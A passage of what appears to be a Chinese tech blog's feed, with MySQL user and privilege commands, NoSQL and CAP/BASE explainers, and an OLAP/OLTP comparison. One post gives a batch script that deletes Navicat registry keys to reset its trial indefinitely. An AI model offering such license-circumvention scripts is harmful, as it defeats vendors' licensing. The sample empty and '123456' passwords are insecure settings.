<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'username'</span>@<span class="string">'host'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'newpassword'</span>);</span><br></pre></td></tr></table></figure>

<p>如果是当前登陆用户用SET PASSWORD = PASSWORD(“newpassword”);</p>
<p>实例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">password</span> <span class="keyword">for</span> root@localhost=<span class="keyword">password</span>(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="keyword">name</span>=<span class="keyword">PASSWORD</span>(<span class="string">'new password'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'cat'</span>@<span class="string">'%'</span> = <span class="keyword">PASSWORD</span>(<span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="删除用户和撤销权限"><a href="#删除用户和撤销权限" class="headerlink" title="删除用户和撤销权限"></a>删除用户和撤销权限</h4><ul>
<li>取消一个账户和其权限</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Drop</span> <span class="keyword">USER</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> username@<span class="string">'%'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> username@localhost</span><br></pre></td></tr></table></figure>

<ul>
<li>取消授权用户:</li>
</ul>
<p>语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> privilege <span class="keyword">ON</span> databasename.tablename <span class="keyword">FROM</span> <span class="string">'username'</span>@<span class="string">'host'</span>;</span><br></pre></td></tr></table></figure>

<p>例子:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> <span class="string">'cat'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> test.user <span class="keyword">FROM</span> <span class="string">'cat'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">revoke</span> <span class="keyword">all</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> sss@localhost ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">revoke</span> <span class="keyword">all</span> <span class="keyword">on</span> user.* <span class="keyword">from</span> <span class="string">'admin'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GRANTS</span> <span class="keyword">FOR</span> <span class="string">'cat'</span>@<span class="string">'%'</span>;     //查看授权</span><br></pre></td></tr></table></figure>

<ul>
<li>删除用户：</li>
</ul>
<p>语法: </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span> = <span class="string">"user_name"</span> <span class="keyword">and</span> host = <span class="string">"host_name"</span> ;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'sss'</span> <span class="keyword">and</span> host=<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h4><ul>
<li>查看所有数据库： 数据库目录：/usr/local/mysql/data</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;  SHOW DATABASES;   //显示数据库</span><br><span class="line"></span><br><span class="line">mysql&gt;  USE abccs         //进入数据库</span><br><span class="line"></span><br><span class="line">mysql&gt;  SHOW TABLES;      //显示表</span><br><span class="line"></span><br><span class="line">mysql&gt;  DESCRIBE mytable; //显示表结构</span><br><span class="line"></span><br><span class="line">mysql&gt;  CREATE DATABASE abccs;    //创建一个数据库</span><br><span class="line"></span><br><span class="line">mysql&gt;  CREATE TABLE mytable (name VARCHAR(20), sex CHAR(1), birth DATE, birthaddr VARCHAR(20));   //创建表</span><br><span class="line"></span><br><span class="line">mysql&gt;  insert into mytable values (‘abccs’,‘f’,‘1977-07-07’,‘china’);   //插入表数据</span><br></pre></td></tr></table></figure>

<p>使用文本方式插入数据：</p>
<p>mysql.txt内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">abccs f 1977-07-07 china</span><br><span class="line"></span><br><span class="line">mary f 1978-12-12 usa</span><br><span class="line"></span><br><span class="line">tom m 1970-09-02 usa</span><br></pre></td></tr></table></figure>

<p>执行sql</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;  LOAD DATA LOCAL INFILE "mytable.txt" INTO TABLE pet;    //导入TXT文件数据</span><br></pre></td></tr></table></figure>

<p>2.删除数据库：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt;  drop database drop_database;   //删除一个已经确定存在的数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">ENGINE</span>=存储引擎名；  //修改表的存储引擎</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> 属性名； //删除字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 旧表名 <span class="keyword">rename</span> <span class="keyword">to</span> 新表名；  //修改表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">modify</span> 属性名 数据类型；  //修改字段数据类型</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">change</span> 旧属性名 新属性名 新数据类型； //修改字段名</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> FOREING <span class="keyword">KEY</span> 外键别名； //删除子表外键约束</span><br></pre></td></tr></table></figure>

<p>增加表字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> example <span class="keyword">add</span> phone VACGAR(<span class="number">20</span>); //增加无约束的字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> example <span class="keyword">add</span> age <span class="built_in">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>; //增加万增约束的字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> example <span class="keyword">add</span> <span class="keyword">num</span> <span class="built_in">INT</span>(<span class="number">8</span>) PRIMARY <span class="keyword">KEY</span> <span class="keyword">FIRST</span>;  //表的第一个位置增加字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> example <span class="keyword">add</span> address <span class="built_in">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">AFTER</span> phone;  //表的指定位置之后增加字段</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> example <span class="keyword">modify</span> <span class="keyword">name</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">FIRST</span>; //把字段修改到第一位</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> example <span class="keyword">modify</span> <span class="keyword">num</span> <span class="built_in">INT</span>(<span class="number">8</span>) ATER phone；//把字段修改到指定字段之后</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Navicat Premium 16无限试用方法</title>
    <url>/articles/Navicat-Premium-16%E6%97%A0%E9%99%90%E8%AF%95%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="1-前往官网下载【Navicat-Premium-16】"><a href="#1-前往官网下载【Navicat-Premium-16】" class="headerlink" title="1.前往官网下载【Navicat Premium 16】"></a>1.前往官网下载【Navicat Premium 16】</h2><p><a href="http://www.navicat.com.cn/products" target="_blank" rel="noopener">http://www.navicat.com.cn/products</a></p>
<h2 id="2-创建清理试用信息bat"><a href="#2-创建清理试用信息bat" class="headerlink" title="2.创建清理试用信息bat"></a>2.创建清理试用信息bat</h2><p>Navicat Premium 16Crack.bat</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Delete HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPremium\Registration[version and language]</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('"REG QUERY "HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPremium" /s | <span class="built_in">findstr</span> /L Registration"') <span class="keyword">do</span> (</span><br><span class="line">    reg delete <span class="variable">%%i</span> /va /f</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Delete Info folder under HKEY_CURRENT_USER\Software\Classes\CLSID</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('"REG QUERY "HKEY_CURRENT_USER\Software\Classes\CLSID" /s | <span class="built_in">findstr</span> /E Info"') <span class="keyword">do</span> (</span><br><span class="line">    reg delete <span class="variable">%%i</span> /va /f</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Finish</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>在每次试用到期时，执行清理，或者添加至定时程序中，每日自动清理相当于无限试用</p>
<h2 id="3-说明"><a href="#3-说明" class="headerlink" title="3.说明"></a>3.说明</h2><p><font style="color:red;font-size:1.5rem;">本项目自始至终都是免费使用，如果有你发现有人盗取牟利，请拒绝并不遗余力地在一切平台举报投诉他！</font></p>
<hr>

<blockquote>
<p>本项目只做个人学习研究之用，不得用于商业用途！<br>若资金允许，请点击<a href="http://www.navicat.com.cn/store/navicat-premium-plan" target="_blank" rel="noopener">链接</a>购买正版，谢谢合作！</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>NoSQL 简介</title>
    <url>/articles/NoSQL-%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。</p>
<p>在现代的计算系统上每天网络上都会产生庞大的数据量。</p>
<p>这些数据有很大一部分是由关系数据库管理系统（RDMBSs）来处理。 1970年 E.F.Codd’s提出的关系模型的论文 “A relational model of data for large shared data banks”，这使得数据建模和应用程序编程更加简单。</p>
<p>通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。</p>
<p>NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至2009年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
<h4 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h4><p>事务在英文中是transaction，和现实世界中的交易很类似，关系型数据库遵循ACID规则。它有如下四个特性：</p>
<ul>
<li>A (Atomicity) 原子性</li>
</ul>
<p>原子性很容易理解，也就是说事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。</p>
<p>比如银行转账，从A账户转100元至B账户，分为两个步骤：1）从A账户取100元；2）存入100元至B账户。这两步要么一起完成，要么一起不完成，如果只完成第一步，第二步失败，钱会莫名其妙少了100元。</p>
<ul>
<li>C (Consistency) 一致性</li>
</ul>
<p>一致性也比较容易理解，也就是说数据库要一直处于一致的状态，事务的运行不会改变数据库原本的一致性约束。</p>
<p>例如现有完整性约束a+b=10，如果一个事务改变了a，那么必须得改变b，使得事务结束后依然满足a+b=10，否则事务失败。</p>
<ul>
<li>I (Isolation) 独立性</li>
</ul>
<p>所谓的独立性是指并发的事务之间不会互相影响，如果一个事务要访问的数据正在被另外一个事务修改，只要另外一个事务未提交，它所访问的数据就不受未提交事务的影响。</p>
<p>比如现有有个交易是从A账户转100元至B账户，在这个交易还未完成的情况下，如果此时B查询自己的账户，是看不到新增加的100元的。</p>
<ul>
<li>D (Durability) 持久性</li>
</ul>
<p>持久性是指一旦事务提交后，它所做的修改将会永久的保存在数据库上，即使出现宕机也不会丢失。</p>
<h4 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h4><p>分布式系统（distributed system）由多台计算机和通信的软件组件通过计算机网络连接（本地网络或广域网）组成。</p>
<p>分布式系统是建立在网络之上的软件系统。正是因为软件的特性，所以分布式系统具有高度的内聚性和透明性。</p>
<p>因此，网络和分布式系统之间的区别更多的在于高层软件（特别是操作系统），而不是硬件。</p>
<p>分布式系统可以应用在在不同的平台上如：Pc、工作站、局域网和广域网上等。</p>
<p>分布式计算的优点</p>
<ul>
<li><p>可靠性（容错） ： 分布式计算系统中的一个重要的优点是可靠性。一台服务器的系统崩溃并不影响到其余的服务器。</p>
</li>
<li><p>可扩展性：在分布式计算系统可以根据需要增加更多的机器。</p>
</li>
<li><p>资源共享：共享数据是必不可少的应用，如银行，预订系统。</p>
</li>
<li><p>灵活性：由于该系统是非常灵活的，它很容易安装，实施和调试新的服务。</p>
</li>
<li><p>更快的速度：分布式计算系统可以有多台计算机的计算能力，使得它比其他系统有更快的处理速度。</p>
</li>
<li><p>开放系统：由于它是开放的系统，本地或者远程都可以访问到该服务。</p>
</li>
<li><p>更高的性能：相较于集中式计算机网络集群可以提供更高的性能（及更好的性价比）。</p>
</li>
</ul>
<p>分布式计算的缺点</p>
<ul>
<li><p>故障排除：故障排除和诊断问题。</p>
</li>
<li><p>软件：更少的软件支持是分布式计算系统的主要缺点。</p>
</li>
<li><p>网络：网络基础设施的问题，包括：传输问题，高负载，信息丢失等。</p>
</li>
<li><p>安全性：开发系统的特性让分布式计算系统存在着数据的安全性和共享的风险等问题。</p>
</li>
</ul>
<h4 id="NoSql"><a href="#NoSql" class="headerlink" title="NoSql"></a>NoSql</h4><h5 id="什么是NoSQL"><a href="#什么是NoSQL" class="headerlink" title="什么是NoSQL"></a>什么是NoSQL</h5><p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>
<p>NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
<h5 id="为什么使用NoSQL"><a href="#为什么使用NoSQL" class="headerlink" title="为什么使用NoSQL"></a>为什么使用NoSQL</h5><p>今天我们可以通过第三方平台（如：Google,Facebook等）可以很容易的访问和抓取数据。用户的个人信息，社交网络，地理位置，用户生成的数据和用户操作日志已经成倍的增加。我们如果要对这些用户数据进行挖掘，那SQL数据库已经不适合这些应用了, NoSQL数据库的发展也却能很好的处理这些大的数据。</p>
<p><img src="/articles/NoSQL-简介/0.png" alt></p>
<p>实例</p>
<p>社会化关系网:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Each record: UserID1, UserID2</span><br><span class="line"></span><br><span class="line">Separate records: UserID, first_name,last_name, age, gender,...</span><br><span class="line"></span><br><span class="line">Task: Find all friends of friends of friends of ... friends of a given user.</span><br></pre></td></tr></table></figure>

<p>Wikipedia 页面 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Large collection of documents</span><br><span class="line"></span><br><span class="line">Combination of structured and unstructured data</span><br><span class="line"></span><br><span class="line">Task: Retrieve all pages regarding athletics of Summer Olympic before 1950.</span><br></pre></td></tr></table></figure>

<p>RDBMS vs NoSQL</p>
<p>RDBMS</p>
<ul>
<li><p>高度组织化结构化数据</p>
</li>
<li><p>结构化查询语言（SQL） (SQL)</p>
</li>
<li><p>数据和关系都存储在单独的表中。</p>
</li>
<li><p>数据操纵语言，数据定义语言</p>
</li>
<li><p>严格的一致性</p>
</li>
<li><p>基础事务</p>
</li>
</ul>
<p>NoSQL</p>
<ul>
<li><p>代表着不仅仅是SQL</p>
</li>
<li><p>没有声明性查询语言</p>
</li>
<li><p>没有预定义的模式</p>
</li>
</ul>
<p>-键 - 值对存储，列存储，文档存储，图形数据库</p>
<ul>
<li><p>最终一致性，而非ACID属性</p>
</li>
<li><p>非结构化和不可预知的数据</p>
</li>
<li><p>CAP定理</p>
</li>
<li><p>高性能，高可用性和可伸缩性</p>
</li>
</ul>
<p><img src="/articles/NoSQL-简介/1.png" alt></p>
<h5 id="NoSQL-简史"><a href="#NoSQL-简史" class="headerlink" title="NoSQL 简史"></a>NoSQL 简史</h5><p>NoSQL一词最早出现于1998年，是Carlo Strozzi开发的一个轻量、开源、不提供SQL功能的关系数据库。</p>
<p>2009年，Last.fm的Johan Oskarsson发起了一次关于分布式开源数据库的讨论[2]，来自Rackspace的Eric Evans再次提出了NoSQL的概念，这时的NoSQL主要指非关系型、分布式、不提供ACID的数据库设计模式。</p>
<p>2009年在亚特兰大举行的”no:sql(east)”讨论会是一个里程碑，其口号是”select fun, profit from real_world where relational=false;”。因此，对NoSQL最普遍的解释是”非关联型的”，强调Key-Value Stores和文档数据库的优点，而不是单纯的反对RDBMS。</p>
<h5 id="CAP定理（CAP-theorem）"><a href="#CAP定理（CAP-theorem）" class="headerlink" title="CAP定理（CAP theorem）"></a>CAP定理（CAP theorem）</h5><p>在计算机科学中, CAP定理（CAP theorem）, 又被称作 布鲁尔定理（Brewer’s theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点:</p>
<p>一致性(Consistency) (所有节点在同一时间具有相同的数据)可用性(Availability) (保证每个请求不管成功或者失败都有响应)分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作)</p>
<p>CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。</p>
<p>因此，根据 CAP 原理将 NoSQL 数据库分成了满足 CA 原则、满足 CP 原则和满足 AP 原则三 大类：</p>
<ul>
<li><p>CA - 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。</p>
</li>
<li><p>CP - 满足一致性，分区容忍性的系统，通常性能不是特别高。</p>
</li>
<li><p>AP - 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。</p>
</li>
</ul>
<p><img src="/articles/NoSQL-简介/2.png" alt></p>
<h5 id="NoSQL的优点-缺点"><a href="#NoSQL的优点-缺点" class="headerlink" title="NoSQL的优点/缺点"></a>NoSQL的优点/缺点</h5><p>优点:</p>
<ul>
<li>高可扩展性- 分布式计算- 低成本- 架构的灵活性，半结构化数据- 没有复杂的关系</li>
</ul>
<p>缺点:</p>
<ul>
<li>没有标准化- 有限的查询功能（到目前为止）- 最终一致是不直观的程序</li>
</ul>
<p>BASE</p>
<p>BASE：Basically Available, Soft-state, Eventually Consistent。 由 Eric Brewer 定义。</p>
<p>CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。</p>
<p>BASE是NoSQL数据库通常对可用性及一致性的弱要求原则:</p>
<p>Basically Availble –基本可用Soft-state –软状态/柔性事务。 “Soft state” 可以理解为”无连接”的, 而 “Hard state” 是”面向连接”的Eventual Consistency –最终一致性 最终一致性， 也是是 ACID 的最终目的。</p>
<p>ACID vs BASEACIDBASE原子性(Atomicity)基本可用(Basically Available)一致性(Consistency)软状态/柔性事务(Soft state)隔离性(Isolation)最终一致性 (Eventual consistency)持久性 (Durable)</p>
<p>NoSQL 数据库分类类型部分代表</p>
<p>特点列存储</p>
<p>Hbase</p>
<p>Cassandra</p>
<p>Hypertable</p>
<p>顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</p>
<p>文档存储</p>
<p>MongoDB</p>
<p>CouchDB</p>
<p>文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有有机会对某些字段建立索引，实现关系数据库的某些功能。</p>
<p>key-value存储</p>
<p>Tokyo Cabinet / Tyrant</p>
<p>Berkeley DB</p>
<p>MemcacheDB</p>
<p>Redis</p>
<p>可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</p>
<p>图存储</p>
<p>Neo4J</p>
<p>FlockDB</p>
<p>图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</p>
<p>对象存储</p>
<p>db4o</p>
<p>Versant</p>
<p>通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</p>
<p>xml数据库</p>
<p>Berkeley DB XML</p>
<p>BaseX</p>
<p>高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>OLAP、OLTP的介绍和比较</title>
    <url>/articles/OLAP-OLTP%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%92%8C%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<p>OLTP与OLAP的介绍</p>
<p>数据处理大致可以分成两大类：联机事务处理OLTP（on-line transaction processing）、联机分析处理OLAP（On-Line Analytical Processing）。OLTP是传统的关系型<a href="https://so.csdn.net/so/search/s.do?q=mysql" target="_blank" rel="noopener">数据库</a>的主要应用，主要是基本的、日常的事务处理，例如银行交易。OLAP是数据仓库系统的主要应用，支持复杂的分析操作，侧重决策支持，并且提供直观易懂的查询结果。</p>
<p>OLTP 系统强调数据库内存效率，强调内存各种指标的命令率，强调绑定变量，强调并发操作；</p>
<p>OLAP 系统则强调数据分析，强调SQL执行市场，强调磁盘I/O，强调分区等。</p>
<p>OLTP与OLAP之间的比较：</p>
<p><img src="/articles/OLAP-OLTP的介绍和比较/0.png" alt="OLTP与OLAP之间的比较"></p>
<p>OLTP，也叫联机事务处理（Online Transaction Processing），表示事务性非常高的系统，一般都是高可用的在线系统，以小的事务以及小的查询为主，评估其系统的时候，一般看其每秒执行的Transaction以及Execute SQL的数量。在这样的系统中，单个数据库每秒处理的Transaction往往超过几百个，或者是几千个，Select 语句的执行量每秒几千甚至几万个。典型的OLTP系统有电子商务系统、银行、证券等，如美国eBay的业务数据库，就是很典型的OLTP数据库。</p>
<p>OLTP系统最容易出现瓶颈的地方就是CPU与磁盘子系统。</p>
<p>（1）CPU出现瓶颈常表现在逻辑读总量与计算性函数或者是过程上，逻辑读总量等于单个语句的逻辑读乘以执行次数，如果单个语句执行速度虽然很快，但是执行次数非常多，那么，也可能会导致很大的逻辑读总量。设计的方法与优化的方法就是减少单个语句的逻辑读，或者是减少它们的执行次数。另外，一些计算型的函数，如自定义函数、decode等的频繁使用，也会消耗大量的CPU时间，造成系统的负载升高，正确的设计方法或者是优化方法，需要尽量避免计算过程，如保存计算结果到统计表就是一个好的方法。</p>
<p>（2）磁盘子系统在OLTP环境中，它的承载能力一般取决于它的IOPS处理能力. 因为在OLTP环境中，磁盘物理读一般都是db file sequential read，也就是单块读，但是这个读的次数非常频繁。如果频繁到磁盘子系统都不能承载其IOPS的时候，就会出现大的性能问题。</p>
<p>OLTP比较常用的设计与优化方式为Cache技术与B-tree索引技术，Cache决定了很多语句不需要从磁盘子系统获得数据，所以，Web cache与Oracle data buffer对OLTP系统是很重要的。另外，在索引使用方面，语句越简单越好，这样执行计划也稳定，而且一定要使用绑定变量，减少语句解析，尽量减少表关联，尽量减少分布式事务，基本不使用分区技术、MV技术、并行技术及位图索引。因为并发量很高，批量更新时要分批快速提交，以避免阻塞的发生。</p>
<p>OLTP 系统是一个数据块变化非常频繁，SQL 语句提交非常频繁的系统。 对于数据块来说，应尽可能让数据块保存在内存当中，对于SQL来说，尽可能使用变量绑定技术来达到SQL重用，减少物理I/O 和重复的SQL 解析，从而极大的改善数据库的性能。</p>
<p>这里影响性能除了绑定变量，还有可能是热快（hot block）。 当一个块被多个用户同时读取时，Oracle 为了维护数据的一致性，需要使用Latch来串行化用户的操作。当一个用户获得了latch后，其他用户就只能等待，获取这个数据块的用户越多，等待就越明显。 这就是热快的问题。 这种热快可能是数据块，也可能是回滚端块。 对于数据块来讲，通常是数据库的数据分布不均匀导致，如果是索引的数据块，可以考虑创建反向索引来达到重新分布数据的目的，对于回滚段数据块，可以适当多增加几个回滚段来避免这种争用。</p>
<p>OLAP，也叫联机分析处理（Online Analytical Processing）系统，有的时候也叫DSS决策支持系统，就是我们说的数据仓库。在这样的系统中，语句的执行量不是考核标准，因为一条语句的执行时间可能会非常长，读取的数据也非常多。所以，在这样的系统中，考核的标准往往是磁盘子系统的吞吐量（带宽），如能达到多少MB/s的流量。</p>
<p>磁盘子系统的吞吐量则往往取决于磁盘的个数，这个时候，Cache基本是没有效果的，数据库的读写类型基本上是db file scattered read与direct path read/write。应尽量采用个数比较多的磁盘以及比较大的带宽，如4Gb的光纤接口。</p>
<p>在OLAP系统中，常使用分区技术、并行技术。</p>
<p>分区技术在OLAP系统中的重要性主要体现在数据库管理上，比如数据库加载，可以通过分区交换的方式实现，备份可以通过备份分区表空间实现，删除数据可以通过分区进行删除，至于分区在性能上的影响，它可以使得一些大表的扫描变得很快（只扫描单个分区）。另外，如果分区结合并行的话，也可以使得整个表的扫描会变得很快。总之，分区主要的功能是管理上的方便性，它并不能绝对保证查询性能的提高，有时候分区会带来性能上的提高，有时候会降低。</p>
<p>并行技术除了与分区技术结合外，在Oracle 10g中，与RAC结合实现多节点的同时扫描，效果也非常不错，可把一个任务，如select的全表扫描，平均地分派到多个RAC的节点上去。</p>
<p>在OLAP系统中，不需要使用绑定（BIND）变量，因为整个系统的执行量很小，分析时间对于执行时间来说，可以忽略，而且可避免出现错误的执行计划。但是OLAP中可以大量使用位图索引，物化视图，对于大的事务，尽量寻求速度上的优化，没有必要像OLTP要求快速提交，甚至要刻意减慢执行的速度。</p>
<p>绑定变量真正的用途是在OLTP系统中，这个系统通常有这样的特点，用户并发数很大，用户的请求十分密集，并且这些请求的SQL 大多数是可以重复使用的。</p>
<p>对于OLAP系统来说，绝大多数时候数据库上运行着的是报表作业，执行基本上是聚合类的SQL 操作，比如group by，这时候，把优化器模式设置为all_rows是恰当的。 而对于一些分页操作比较多的网站类数据库，设置为first_rows会更好一些。 但有时候对于OLAP 系统，我们又有分页的情况下，我们可以考虑在每条SQL 中用hint。 如：</p>
<p>Select  a.* from table a;</p>
<p>分开设计与优化</p>
<p>在设计上要特别注意，如在高可用的OLTP环境中，不要盲目地把OLAP的技术拿过来用。</p>
<p>如分区技术，假设不是大范围地使用分区关键字，而采用其它的字段作为where条件，那么，如果是本地索引，将不得不扫描多个索引，而性能变得更为低下。如果是全局索引，又失去分区的意义。</p>
<p>并行技术也是如此，一般在完成大型任务时才使用，如在实际生活中，翻译一本书，可以先安排多个人，每个人翻译不同的章节，这样可以提高翻译速度。如果只是翻译一页书，也去分配不同的人翻译不同的行，再组合起来，就没必要了，因为在分配工作的时间里，一个人或许早就翻译完了。</p>
<p>位图索引也是一样，如果用在OLTP环境中，很容易造成阻塞与死锁。但是，在OLAP环境中，可能会因为其特有的特性，提高OLAP的查询速度。MV也是基本一样，包括触发器等，在DML频繁的OLTP系统上，很容易成为瓶颈，甚至是Library Cache等待，而在OLAP环境上，则可能会因为使用恰当而提高查询速度。</p>
<p>对于OLAP系统，在内存上可优化的余地很小，增加CPU 处理速度和磁盘I/O 速度是最直接的提高数据库性能的方法，当然这也意味着系统成本的增加。</p>
<p>比如我们要对几亿条或者几十亿条数据进行聚合处理，这种海量的数据，全部放在内存中操作是很难的，同时也没有必要，因为这些数据快很少重用，缓存起来也没有实际意义，而且还会造成物理I/O相当大。 所以这种系统的瓶颈往往是磁盘I/O上面的。</p>
<p>对于OLAP系统，SQL 的优化非常重要，因为它的数据量很大，做全表扫描和索引对性能上来说差异是非常大的。</p>
<p>其他</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Oracle 10g以前的版本建库过程中可供选择的模板有：</span><br><span class="line"></span><br><span class="line">Data Warehouse （数据仓库）</span><br><span class="line"></span><br><span class="line">General Purpose  （通用目的、一般用途）</span><br><span class="line"></span><br><span class="line">New Database</span><br><span class="line"></span><br><span class="line">Transaction Processing  （事务处理）</span><br><span class="line"></span><br><span class="line">Oracle 11g的版本建库过程中可供选择的模板有：</span><br><span class="line"></span><br><span class="line">    一般用途或事务处理</span><br><span class="line"></span><br><span class="line">    定制数据库</span><br><span class="line"></span><br><span class="line">    数据仓库</span><br></pre></td></tr></table></figure>

<p>个人对这些模板的理解为：</p>
<p>联机分析处理（OLAP,On-line Analytical Processing），数据量大，DML少。使用数据仓库模板</p>
<p>联机事务处理（OLTP,On-line Transaction Processing），数据量少，DML频繁，并行事务处理多，但是一般都很短。使用一般用途或事务处理模板。</p>
<p>决策支持系统（DDS，Decision support system)，典型的操作是全表扫描，长查询，长事务，但是一般事务的个数很少，往往是一个事务独占系统。</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
